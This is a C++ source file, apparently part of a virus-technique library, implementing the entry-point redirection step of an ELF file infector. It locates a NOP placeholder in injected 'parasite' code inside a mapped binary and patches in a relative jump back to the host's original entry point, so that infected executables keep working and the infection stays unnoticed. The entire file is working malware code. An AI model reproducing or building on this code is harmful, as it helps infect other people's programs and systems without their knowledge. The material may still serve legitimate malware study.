#include "common/patch_pattern.hh"
#include "common/redirect_elf_entry_point.hh"

namespace vt::common {

bool redirect_elf_entry_point(Elf64_Half binary_type,
                              Elf64_Addr original_entry_point,
                              Elf64_Addr parasite_load_address,
                              size_t parasite_offset, size_t parasite_size,
                              std::span<std::byte> mapping) {
  constexpr auto no_op_to_be_patched = 0x9090909090909090;
  // For x86-64, patch the jmp address to the original entry point.
  // It is assumed that the inserted virus has at least 8 bytes of noop and
  // that's where it jumps back to host.
  // jmp rel32 e9 xxxxxxxx The rel32 offset is from the next instruction after
  // the jmp. The patched jump instruction is always 5 bytes.
  auto patch_offset_from_parasite_start = common::find<uint64_t>(
      mapping.subspan(parasite_offset, parasite_size), no_op_to_be_patched);
  if (patch_offset_from_parasite_start == -1) {
    return false;
  }

  // Calculate the difference between original (destination) and the next
  // instruction after the jmp.
  int32_t rel = original_entry_point -
                (parasite_load_address + patch_offset_from_parasite_start + 5);

  constexpr uint64_t branch_op_code = 0xe9;
  auto* patch_addr =
      &mapping[parasite_offset + patch_offset_from_parasite_start];
  *reinterpret_cast<uint64_t*>(patch_addr) = branch_op_code;
  *(int32_t*)(&mapping[parasite_offset + patch_offset_from_parasite_start +
                       1]) = rel;

  return true;
}

}  // namespace vt::common
